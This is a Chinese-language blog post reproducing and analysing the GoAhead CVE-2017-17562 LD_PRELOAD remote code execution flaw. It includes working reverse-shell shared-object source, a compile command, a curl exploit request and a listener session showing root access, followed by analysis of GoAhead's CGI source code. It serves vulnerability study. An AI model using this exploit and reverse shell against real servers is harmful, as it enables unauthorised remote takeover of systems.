<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
    <title>CVE-2017-17562 && CVE-2021-42342</title>
    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header>
        <nav class="site-nav">
            <a href="./index.html" class="nav-link">/home</a>
            <span class="nav-separator">|</span>
            <a href="./about.html" class="nav-link">/about</a>
        </nav>
        <div class="terminal-prompt">
            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
            <span class="cmd">cat ./CVE-2017-17562 && CVE-2021-42342.md</span><span class="cursor">█</span>
        </div>
        <h1 class="post-title">CVE-2017-17562 && CVE-2021-42342</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2025-04-22]</div>
    </header>
    <div class="layout-grid">
                <main><h2 id="cve-2017-17562">CVE-2017-17562</h2><h3 id="miao-shu">描述</h3><blockquote>
<p>CVE-2017-17562是一个远程命令执行漏洞，受影响的GoAhead版本为2.5.0到3.6.4之间。受影响的版本若启用了CGI并动态链接了CGI程序的话，则可导致远程代码执行。漏洞的原因在于cgi.c的cgiHandler函数使用了不可信任的HTTP请求参数初始化CGI脚本的环境，可使用环境变量（LD_PRELOAD），利用glibc动态链接器加载任意程序实现远程代码执行。</p>
</blockquote>
<h3 id="fu-xian">复现</h3><p>恶意so</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#include</span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include</span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include</span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/socket.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include</span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">netinet/in.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*server_ip=&quot;</span><span style="color:#a3be8c;">127.0.0.1</span><span style="color:#c0c5ce;">&quot;;
</span><span style="color:#c0c5ce;">uint32_t server_port=</span><span style="color:#d08770;">7777</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">reverse_shell</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">) </span><span style="color:#b48ead;">__attribute__</span><span style="color:#c0c5ce;">((constructor));
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">reverse_shell</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">) 
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">//socket initialize
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> sock = </span><span style="color:#8fa1b3;">socket</span><span style="color:#c0c5ce;">(AF_INET, SOCK_STREAM, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sockaddr_in attacker_addr = {</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">};
</span><span style="color:#c0c5ce;">    attacker_addr.</span><span style="color:#bf616a;">sin_family </span><span style="color:#c0c5ce;">= AF_INET;
</span><span style="color:#c0c5ce;">    attacker_addr.</span><span style="color:#bf616a;">sin_port </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">htons</span><span style="color:#c0c5ce;">(server_port);
</span><span style="color:#c0c5ce;">    attacker_addr.</span><span style="color:#bf616a;">sin_addr</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">s_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">inet_addr</span><span style="color:#c0c5ce;">(server_ip);
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">//connect to the server
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">connect</span><span style="color:#c0c5ce;">(sock, (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sockaddr *)&amp;attacker_addr,sizeof(attacker_addr))!=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">//dup the socket to stdin, stdout and stderr
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">dup2</span><span style="color:#c0c5ce;">(sock, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">dup2</span><span style="color:#c0c5ce;">(sock, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">dup2</span><span style="color:#c0c5ce;">(sock, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">//execute /bin/sh to get a shell
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">execve</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>编译</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">gcc -shared -fPIC ./a.c -o exp.so
</span></pre>
<p>监听7777端口后发送请求</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">ayoung@ay:~$ curl -X POST --data-binary @exp.so http://127.0.0.1:8888/cgi-bin/cgitest\?LD_PRELOAD\=/proc/self/fd/0
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">ayoung@ay:~$ nc -lvnp 7777
</span><span style="color:#c0c5ce;">Listening on 0.0.0.0 7777
</span><span style="color:#c0c5ce;">Connection received on 127.0.0.1 48692
</span><span style="color:#c0c5ce;">whoami
</span><span style="color:#c0c5ce;">root
</span></pre>
<h3 id="fen-xi">分析</h3><p>每个请求的结构体<code>Webs</code>定义在 <code>goahead.h</code>中</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/**
</span><span style="color:#65737e;">    GoAhead request structure. This is a per-socket connection structure.
</span><span style="color:#65737e;">    @defgroup Webs Webs
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">typedef struct</span><span style="color:#c0c5ce;"> Webs {
</span><span style="color:#c0c5ce;">    WebsBuf         rxbuf;              </span><span style="color:#65737e;">/**&lt; Raw receive buffer */
</span><span style="color:#c0c5ce;">    WebsBuf         input;              </span><span style="color:#65737e;">/**&lt; Receive buffer after de-chunking */
</span><span style="color:#c0c5ce;">    WebsBuf         output;             </span><span style="color:#65737e;">/**&lt; Transmit buffer after chunking */
</span><span style="color:#c0c5ce;">    WebsBuf         chunkbuf;           </span><span style="color:#65737e;">/**&lt; Pre-chunking data buffer */
</span><span style="color:#c0c5ce;">    WebsBuf         *txbuf;
</span><span style="color:#c0c5ce;">    WebsTime        since;              </span><span style="color:#65737e;">/**&lt; Parsed if-modified-since time */
</span><span style="color:#c0c5ce;">    WebsTime        timestamp;          </span><span style="color:#65737e;">/**&lt; Last transaction with browser */
</span><span style="color:#c0c5ce;">    WebsHash        vars;               </span><span style="color:#65737e;">/**&lt; CGI standard variables */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             timeout;            </span><span style="color:#65737e;">/**&lt; Timeout handle */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">            ipaddr[ME_MAX_IP];  </span><span style="color:#65737e;">/**&lt; Connecting ipaddress */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">            ifaddr[ME_MAX_IP];  </span><span style="color:#65737e;">/**&lt; Local interface ipaddress */
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             rxChunkState;       </span><span style="color:#65737e;">/**&lt; Rx chunk encoding state */
</span><span style="color:#c0c5ce;">    ssize           rxChunkSize;        </span><span style="color:#65737e;">/**&lt; Rx chunk size */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*rxEndp;            </span><span style="color:#65737e;">/**&lt; Pointer to end of raw data in input beyond endp */
</span><span style="color:#c0c5ce;">    ssize           lastRead;           </span><span style="color:#65737e;">/**&lt; Number of bytes last read from the socket */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">bool</span><span style="color:#c0c5ce;">            eof;                </span><span style="color:#65737e;">/**&lt; If at the end of the request content */
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">            txChunkPrefix[</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">];  </span><span style="color:#65737e;">/**&lt; Transmit chunk prefix */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*txChunkPrefixNext; </span><span style="color:#65737e;">/**&lt; Current I/O pos in txChunkPrefix */
</span><span style="color:#c0c5ce;">    ssize           txChunkPrefixLen;   </span><span style="color:#65737e;">/**&lt; Length of prefix */
</span><span style="color:#c0c5ce;">    ssize           txChunkLen;         </span><span style="color:#65737e;">/**&lt; Length of the chunk */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             txChunkState;       </span><span style="color:#65737e;">/**&lt; Transmit chunk state */
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*authDetails;       </span><span style="color:#65737e;">/**&lt; Http header auth details */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*authResponse;      </span><span style="color:#65737e;">/**&lt; Outgoing auth header */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*authType;          </span><span style="color:#65737e;">/**&lt; Authorization type (Basic/DAA) */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*contentType;       </span><span style="color:#65737e;">/**&lt; Body content type */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*cookie;            </span><span style="color:#65737e;">/**&lt; Request cookie string */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*decodedQuery;      </span><span style="color:#65737e;">/**&lt; Decoded request query */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*digest;            </span><span style="color:#65737e;">/**&lt; Password digest */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*ext;               </span><span style="color:#65737e;">/**&lt; Path extension */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*filename;          </span><span style="color:#65737e;">/**&lt; Document path name */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*host;              </span><span style="color:#65737e;">/**&lt; Requested host */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*method;            </span><span style="color:#65737e;">/**&lt; HTTP request method */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*password;          </span><span style="color:#65737e;">/**&lt; Authorization password */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*path;              </span><span style="color:#65737e;">/**&lt; Path name without query. This is decoded. */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*protoVersion;      </span><span style="color:#65737e;">/**&lt; Protocol version (HTTP/1.1)*/
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*protocol;          </span><span style="color:#65737e;">/**&lt; Protocol scheme (normally http|https) */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*putname;           </span><span style="color:#65737e;">/**&lt; PUT temporary filename */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*query;             </span><span style="color:#65737e;">/**&lt; Request query. This is decoded. */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*realm;             </span><span style="color:#65737e;">/**&lt; Realm field supplied in auth header */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*referrer;          </span><span style="color:#65737e;">/**&lt; The referring page */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*responseCookie;    </span><span style="color:#65737e;">/**&lt; Outgoing cookie */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*url;               </span><span style="color:#65737e;">/**&lt; Full request url. This is not decoded. */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*userAgent;         </span><span style="color:#65737e;">/**&lt; User agent (browser) */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*username;          </span><span style="color:#65737e;">/**&lt; Authorization username */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             sid;                </span><span style="color:#65737e;">/**&lt; Socket id (handler) */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             listenSid;          </span><span style="color:#65737e;">/**&lt; Listen Socket id */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             port;               </span><span style="color:#65737e;">/**&lt; Request port number */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             state;              </span><span style="color:#65737e;">/**&lt; Current state */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             flags;              </span><span style="color:#65737e;">/**&lt; Current flags -- see above */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             code;               </span><span style="color:#65737e;">/**&lt; Response status code */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             routeCount;         </span><span style="color:#65737e;">/**&lt; Route count limiter */
</span><span style="color:#c0c5ce;">    ssize           rxLen;              </span><span style="color:#65737e;">/**&lt; Rx content length */
</span><span style="color:#c0c5ce;">    ssize           rxRemaining;        </span><span style="color:#65737e;">/**&lt; Remaining content to read from client */
</span><span style="color:#c0c5ce;">    ssize           txLen;              </span><span style="color:#65737e;">/**&lt; Tx content length header value */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             wid;                </span><span style="color:#65737e;">/**&lt; Index into webs */
</span><span style="color:#b48ead;">#if</span><span style="color:#c0c5ce;"> ME_GOAHEAD_CGI
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*cgiStdin;          </span><span style="color:#65737e;">/**&lt; Filename for CGI program input */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             cgifd;              </span><span style="color:#65737e;">/**&lt; File handle for CGI program input */
</span><span style="color:#b48ead;">#endif
</span><span style="color:#b48ead;">#if</span><span style="color:#c0c5ce;"> !ME_ROM
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             putfd;              </span><span style="color:#65737e;">/**&lt; File handle to write PUT data */
</span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             docfd;              </span><span style="color:#65737e;">/**&lt; File descriptor for document being served */
</span><span style="color:#c0c5ce;">    ssize           written;            </span><span style="color:#65737e;">/**&lt; Bytes actually transferred */
</span><span style="color:#c0c5ce;">    ssize           putLen;             </span><span style="color:#65737e;">/**&lt; Bytes read by a PUT request */
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             finalized: </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;          </span><span style="color:#65737e;">/**&lt; Request has been completed */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             error: </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;              </span><span style="color:#65737e;">/**&lt; Request has an error */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             connError: </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;          </span><span style="color:#65737e;">/**&lt; Request has a connection error */
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> WebsSession *session;        </span><span style="color:#65737e;">/**&lt; Session record */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> WebsRoute *route;            </span><span style="color:#65737e;">/**&lt; Request route */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> WebsUser *user;              </span><span style="color:#65737e;">/**&lt; User auth record */
</span><span style="color:#c0c5ce;">    WebsWriteProc   writeData;          </span><span style="color:#65737e;">/**&lt; Handler write I/O event callback. Used by fileHandler */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             encoded;            </span><span style="color:#65737e;">/**&lt; True if the password is MD5(username:realm:password) */
</span><span style="color:#b48ead;">#if</span><span style="color:#c0c5ce;"> ME_GOAHEAD_DIGEST
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*cnonce;            </span><span style="color:#65737e;">/**&lt; check nonce */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*digestUri;         </span><span style="color:#65737e;">/**&lt; URI found in digest header */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*nonce;             </span><span style="color:#65737e;">/**&lt; opaque-to-client string sent by server */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*nc;                </span><span style="color:#65737e;">/**&lt; nonce count */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*opaque;            </span><span style="color:#65737e;">/**&lt; opaque value passed from server */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*qop;               </span><span style="color:#65737e;">/**&lt; quality operator */
</span><span style="color:#b48ead;">#endif
</span><span style="color:#b48ead;">#if</span><span style="color:#c0c5ce;"> ME_GOAHEAD_UPLOAD
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             upfd;               </span><span style="color:#65737e;">/**&lt; Upload file handle */
</span><span style="color:#c0c5ce;">    WebsHash        files;              </span><span style="color:#65737e;">/**&lt; Uploaded files */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*boundary;          </span><span style="color:#65737e;">/**&lt; Mime boundary (static) */
</span><span style="color:#c0c5ce;">    ssize           boundaryLen;        </span><span style="color:#65737e;">/**&lt; Boundary length */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             uploadState;        </span><span style="color:#65737e;">/**&lt; Current file upload state */
</span><span style="color:#c0c5ce;">    WebsUpload      *currentFile;       </span><span style="color:#65737e;">/**&lt; Current file context */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*clientFilename;    </span><span style="color:#65737e;">/**&lt; Current file filename */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*uploadTmp;         </span><span style="color:#65737e;">/**&lt; Current temp filename for upload data */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*uploadVar;         </span><span style="color:#65737e;">/**&lt; Current upload form variable name */
</span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void            </span><span style="color:#c0c5ce;">*ssl;               </span><span style="color:#65737e;">/**&lt; SSL context */
</span><span style="color:#c0c5ce;">} Webs;
</span></pre>
<p><code>cgi.c</code>中<code>cgiHandler</code>
先处理拼接出<code>cgiPath</code>
然后解析参数
再处理环境变量，即下面代码片段。只过滤了<code>REMOTE_HOST</code>和<code>HTTP_AUTHORIZATION</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">        Add all CGI variables to the environment strings to be passed to the spawned CGI process. This includes a few
</span><span style="color:#65737e;">        we don&#39;t already have in the symbol table, plus all those that are in the vars symbol table. envp will point
</span><span style="color:#65737e;">        to a walloc&#39;d array of pointers. Each pointer will point to a walloc&#39;d string containing the keyword value pair
</span><span style="color:#65737e;">        in the form keyword=value. Since we don&#39;t know ahead of time how many environment strings there will be the for
</span><span style="color:#65737e;">        loop includes logic to grow the array size via wrealloc.
</span><span style="color:#65737e;">     */
</span><span style="color:#c0c5ce;">    envpsize = </span><span style="color:#d08770;">64</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    envp = </span><span style="color:#8fa1b3;">walloc</span><span style="color:#c0c5ce;">(envpsize * sizeof(</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*));
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(n = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, s = </span><span style="color:#8fa1b3;">hashFirst</span><span style="color:#c0c5ce;">(wp-&gt;vars); s != </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">; s = </span><span style="color:#8fa1b3;">hashNext</span><span style="color:#c0c5ce;">(wp-&gt;vars, s)) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(s-&gt;content.</span><span style="color:#bf616a;">valid </span><span style="color:#c0c5ce;">&amp;&amp; s-&gt;content.</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">== string &amp;&amp;
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">strcmp</span><span style="color:#c0c5ce;">(s-&gt;name.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">string</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">REMOTE_HOST</span><span style="color:#c0c5ce;">&quot;) != </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">&amp;&amp;
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">strcmp</span><span style="color:#c0c5ce;">(s-&gt;name.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">string</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">HTTP_AUTHORIZATION</span><span style="color:#c0c5ce;">&quot;) != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            envp[n++] = </span><span style="color:#8fa1b3;">sfmt</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">=</span><span style="color:#d08770;">%s</span><span style="color:#c0c5ce;">&quot;, s-&gt;name.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">string</span><span style="color:#c0c5ce;">, s-&gt;content.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">string</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">trace</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">Env[</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">] </span><span style="color:#d08770;">%s</span><span style="color:#c0c5ce;">&quot;, n, envp[n-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(n &gt;= envpsize) {
</span><span style="color:#c0c5ce;">                envpsize *= </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">                envp = </span><span style="color:#8fa1b3;">wrealloc</span><span style="color:#c0c5ce;">(envp, envpsize * sizeof(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*));
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    *(envp+n) = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span></pre>
<p>处理完后调用<code>launchCgi</code>启动cgi</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">        Now launch the process.  If not successful, do the cleanup of resources.  If successful, the cleanup will be
</span><span style="color:#65737e;">        done after the process completes.
</span><span style="color:#65737e;">     */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((pHandle = </span><span style="color:#8fa1b3;">launchCgi</span><span style="color:#c0c5ce;">(cgiPath, argp, envp, stdIn, stdOut)) == (CgiPid) -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">    ...
</span><span style="color:#c0c5ce;">    }
</span></pre>
<p>GoAhead对不同架构做了最终启动命令的适配，例如windows使用<code>CreateProcess</code>，vmworks使用<code>taskSpawn</code>，unix使用<code>execve</code>
以unix为例，<code>launchCgi</code>内最终启动子进程运行<code>execve</code>启动cgi，结合前文能够注入环境变量</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">pid = </span><span style="color:#8fa1b3;">vfork</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(pid == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">            Child
</span><span style="color:#65737e;">         */
</span><span style="color:#c0c5ce;">        ...
</span><span style="color:#c0c5ce;">        } </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">execve</span><span style="color:#c0c5ce;">(cgiPath, argp, envp) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">content-type: text/html</span><span style="color:#96b5b4;">\n\n</span><span style="color:#a3be8c;">Execution of cgi process failed</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">_exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
</span></pre>
<p>再回头看请求报文如何解析的，调用栈</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">[#0] 0x7b67396a8ef6 &lt;cgiHandler+0x17&gt;
</span><span style="color:#c0c5ce;">[#1] 0x7b67396bc3f4 &lt;websRunRequest+0x33a&gt;
</span><span style="color:#c0c5ce;">[#2] 0x7b67396aee66 &lt;websPump+0x7e&gt;
</span><span style="color:#c0c5ce;">[#3] 0x7b67396aecee &lt;readEvent+0x176&gt;
</span><span style="color:#c0c5ce;">[#4] 0x7b67396aea42 &lt;socketEvent+0xb5&gt;
